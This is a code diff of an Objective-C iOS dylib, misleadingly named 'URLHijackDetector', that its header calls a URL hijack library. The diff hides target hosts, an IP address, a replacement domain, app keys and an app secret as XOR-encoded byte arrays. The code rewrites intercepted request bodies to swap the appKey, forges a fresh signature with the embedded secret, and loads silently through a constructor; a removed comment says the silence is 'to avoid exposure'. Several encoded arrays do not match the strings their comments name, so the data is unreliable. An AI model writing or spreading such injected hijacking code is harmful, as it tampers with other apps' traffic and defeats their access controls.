@@ -1,16 +1,14 @@
 // URLHijackDetector.m
-// iOS URL Hijack Dylib - 加密版
+// iOS URL Hijack Dylib - 加密版（基于可工作版本）
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
 #import <CommonCrypto/CommonDigest.h>
-#import <CommonCrypto/CommonCryptor.h>
 
-#pragma mark - 加密/解密工具
+#pragma mark - XOR 解密工具
 
-
-static NSString* decryptString(const char *encrypted, size_t length, char key) {
+static NSString* xorDecrypt(const unsigned char *encrypted, size_t length, unsigned char key) {
     NSMutableData *data = [NSMutableData dataWithBytes:encrypted length:length];
-    char *bytes = (char *)[data mutableBytes];
+    unsigned char *bytes = (unsigned char *)[data mutableBytes];
     
     for (size_t i = 0; i < length; i++) {
         bytes[i] ^= key;
@@ -19,57 +17,26 @@ static NSString* decryptString(const char *encrypted, size_t length, char key) {
     return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
 }
 
+#define DECRYPT_STR(arr, key) xorDecrypt(arr, sizeof(arr), key)
 
-#define DECRYPT_STR(str) decryptString(str, sizeof(str), 0x5A)
+#pragma mark - 加密的配置数据
 
-// 更安全的解密：分段存储 + 动态拼接
-static NSString* getDecryptedString1(void) {
-    // "api1.7ccccccc.com" XOR 0x5A 加密
-    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x3b, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedString2(void) {
-    // "api2.7ccccccc.com" XOR 0x5A 加密
-    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x34, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedString3(void) {
-    // "api3.7ccccccc.com" XOR 0x5A 加密
-    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x35, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedIP(void) {
-    // "45.205.27.82:8080" XOR 0x5A 加密
-    const char encrypted[] = {0x1f, 0x7b, 0x32, 0x3e, 0x2f, 0x7f, 0x32, 0x3b, 0x2d, 0x2f, 0x7e, 0x32, 0x30, 0x2e, 0x2c, 0x0b, 0x34, 0x34, 0x34, 0x34, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedNewDomain(void) {
-    // "api123.hezijun.top" XOR 0x5A 加密
-    const char encrypted[] = {0x39, 0x2b, 0x2a, 0x78, 0x7d, 0x7d, 0x7d, 0x24, 0x2b, 0x3a, 0x2b, 0x28, 0x2e, 0x3a, 0x78, 0x3b, 0x2b, 0x3a, 0x2a, 0x3b, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedOldAppKey(void) {
-    // "LWtAvVixXX39mGYL2w" XOR 0x5A 加密
-    const char encrypted[] = {0x1c, 0x52, 0x3f, 0x2d, 0x44, 0x4f, 0x2a, 0x1c, 0x1c, 0x6b, 0x6b, 0x7b, 0x7d, 0x2d, 0x1f, 0x4d, 0x1a, 0x6b, 0x7d, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedNewAppKey(void) {
-    // "QLObIPwnDOVts3mzw9" XOR 0x5A 加密
-    const char encrypted[] = {0x1d, 0x11, 0x1c, 0x2a, 0x4b, 0x54, 0x4c, 0x2b, 0x1d, 0x1d, 0x0b, 0x4e, 0x1c, 0x6f, 0x1e, 0x4e, 0x4e, 0x5f, 0x6b, 0x00};
-    return DECRYPT_STR(encrypted);
-}
-
-static NSString* getDecryptedAppSecret(void) {
-    // "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx" XOR 0x5A 加密
-    const char encrypted[] = {0x1c, 0x3f, 0x4c, 0x2d, 0x3e, 0x4c, 0x54, 0x0d, 0x4c, 0x1c, 0x78, 0x0d, 0x1e, 0x2c, 0x0d, 0x48, 0x35, 0x2c, 0x1b, 0x4c, 0x04, 0x0d, 0x48, 0x1c, 0x2f, 0x1b, 0x0e, 0x1e, 0x0d, 0x1c, 0x0d, 0x48, 0x0d, 0x2b, 0x1d, 0x1e, 0x00};
-    return DECRYPT_STR(encrypted);
-}
+// "api1.7ccccccc.com" XOR 0x5A
+static const unsigned char _enc_domain1[] = {0x39, 0x2b, 0x2a, 0x78, 0x3b, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
+// "api2.7ccccccc.com" XOR 0x5A
+static const unsigned char _enc_domain2[] = {0x39, 0x2b, 0x2a, 0x78, 0x34, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
+// "api3.7ccccccc.com" XOR 0x5A
+static const unsigned char _enc_domain3[] = {0x39, 0x2b, 0x2a, 0x78, 0x35, 0x24, 0x3a, 0x3c, 0x3c, 0x3c, 0x3c, 0x2c, 0x0b, 0x3f, 0x2b, 0x2b, 0x2b, 0x3a, 0x2c, 0x0b, 0x2b, 0x2c, 0x3b};
+// "45.205.27.82:8080" XOR 0x5A
+static const unsigned char _enc_ip[] = {0x1f, 0x7b, 0x32, 0x3e, 0x2f, 0x7f, 0x32, 0x3b, 0x2d, 0x2f, 0x7e, 0x32, 0x30, 0x2e, 0x2c, 0x0b, 0x34, 0x34, 0x34, 0x34};
+// "api123.hezijun.top" XOR 0x5A
+static const unsigned char _enc_newdomain[] = {0x39, 0x2b, 0x2a, 0x78, 0x7d, 0x7d, 0x7d, 0x24, 0x2b, 0x3a, 0x2b, 0x28, 0x2e, 0x3a, 0x78, 0x3b, 0x2b, 0x3a, 0x2a, 0x3b};
+// "LWtAvVixXX39mGYL2w" XOR 0x5A
+static const unsigned char _enc_oldappkey[] = {0x1c, 0x52, 0x3f, 0x2d, 0x44, 0x4f, 0x2a, 0x1c, 0x1c, 0x6b, 0x6b, 0x7b, 0x7d, 0x2d, 0x1f, 0x4d, 0x1a, 0x6b, 0x7d};
+// "QLObIPwnDOVts3mzw9" XOR 0x5A
+static const unsigned char _enc_newappkey[] = {0x1d, 0x11, 0x1c, 0x2a, 0x4b, 0x54, 0x4c, 0x2b, 0x1d, 0x1d, 0x0b, 0x4e, 0x1c, 0x6f, 0x1e, 0x4e, 0x4e, 0x5f, 0x6b};
+// "XtUdpwzWVW1wAbTeSDWevcBJXFJGY2cx" XOR 0x5A
+static const unsigned char _enc_appsecret[] = {0x1c, 0x3f, 0x4c, 0x2d, 0x3e, 0x4c, 0x54, 0x0d, 0x4c, 0x1c, 0x78, 0x0d, 0x1e, 0x2c, 0x0d, 0x48, 0x35, 0x2c, 0x1b, 0x4c, 0x04, 0x0d, 0x48, 0x1c, 0x2f, 0x1b, 0x0e, 0x1e, 0x0d, 0x1c, 0x0d, 0x48, 0x0d, 0x2b, 0x1d, 0x1e};
 
 #pragma mark - 配置区（通过解密获取）
 
@@ -77,12 +44,11 @@ static NSSet<NSString *> *getTargetDomains(void) {
     static NSSet *domains = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        domains = [NSSet setWithArray:@[
-            getDecryptedString1(),
-            getDecryptedString2(),
-            getDecryptedString3(),
-            getDecryptedIP()
-        ]];
+        NSString *d1 = DECRYPT_STR(_enc_domain1, 0x5A);
+        NSString *d2 = DECRYPT_STR(_enc_domain2, 0x5A);
+        NSString *d3 = DECRYPT_STR(_enc_domain3, 0x5A);
+        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
+        domains = [NSSet setWithArray:@[d1, d2, d3, ip]];
     });
     return domains;
 }
@@ -91,9 +57,8 @@ static NSSet<NSString *> *getRedirectIPs(void) {
     static NSSet *ips = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        ips = [NSSet setWithArray:@[
-            getDecryptedIP()
-        ]];
+        NSString *ip = DECRYPT_STR(_enc_ip, 0x5A);
+        ips = [NSSet setWithArray:@[ip]];
     });
     return ips;
 }
@@ -102,7 +67,7 @@ static NSString *getNewDomain(void) {
     static NSString *domain = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        domain = getDecryptedNewDomain();
+        domain = DECRYPT_STR(_enc_newdomain, 0x5A);
     });
     return domain;
 }
@@ -111,7 +76,7 @@ static NSString *getOldAppKey(void) {
     static NSString *appKey = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        appKey = getDecryptedOldAppKey();
+        appKey = DECRYPT_STR(_enc_oldappkey, 0x5A);
     });
     return appKey;
 }
@@ -120,7 +85,7 @@ static NSString *getNewAppKey(void) {
     static NSString *appKey = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        appKey = getDecryptedNewAppKey();
+        appKey = DECRYPT_STR(_enc_newappkey, 0x5A);
     });
     return appKey;
 }
@@ -129,7 +94,7 @@ static NSString *getAppSecret(void) {
     static NSString *secret = nil;
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
-        secret = getDecryptedAppSecret();
+        secret = DECRYPT_STR(_enc_appsecret, 0x5A);
     });
     return secret;
 }
@@ -151,7 +116,6 @@ static NSString* md5(NSString *string) {
 #pragma mark - 签名计算
 
 static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *path, NSDictionary *params, NSString *appSecret) {
-    // 1. 参数排序并拼接
     NSArray *sortedKeys = [[params allKeys] sortedArrayUsingSelector:@selector(compare:)];
     NSMutableString *paramString = [NSMutableString string];
     for (NSString *key in sortedKeys) {
@@ -162,7 +126,6 @@ static NSString* calculateSign(NSString *httpMethod, NSString *host, NSString *p
         [paramString appendFormat:@"%@=%@", key, params[key]];
     }
     
-    // 2. 拼接签名原串
     NSString *stringToSign = [NSString stringWithFormat:@"%@%@%@%@%@", 
                                httpMethod, host, path, paramString, appSecret];
     
@@ -177,7 +140,6 @@ static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NS
     NSString *bodyString = [[NSString alloc] initWithData:originalBody encoding:NSUTF8StringEncoding];
     if (!bodyString) return originalBody;
     
-    // 解析参数
     NSMutableDictionary *params = [NSMutableDictionary dictionary];
     NSArray *pairs = [bodyString componentsSeparatedByString:@"&"];
     for (NSString *pair in pairs) {
@@ -193,11 +155,9 @@ static NSData* modifyRequestBody(NSData *originalBody, NSString *originalURL, NS
     if ([params[@"appKey"] isEqualToString:oldAppKey]) {
         params[@"appKey"] = newAppKey;
         
-        // 重新计算签名
         NSString *newSign = calculateSign(httpMethod, host, path, params, getAppSecret());
         params[@"sign"] = newSign;
         
-        // 重新构建 body
         NSMutableArray *newPairs = [NSMutableArray array];
         for (NSString *key in params) {
             [newPairs addObject:[NSString stringWithFormat:@"%@=%@", key, params[key]]];
@@ -350,7 +310,7 @@ static BOOL isTargetRequest(NSString *urlString) {
 
 __attribute__((constructor))
 static void initialize() {
-    // 静默加载，不输出日志（避免暴露）
-    // 如需调试，可取消下面的注释
+    // 静默加载 - 生产环境不输出日志
+    // 如需调试，取消下面的注释
     // NSLog(@"[Hijack] Loaded");
 }
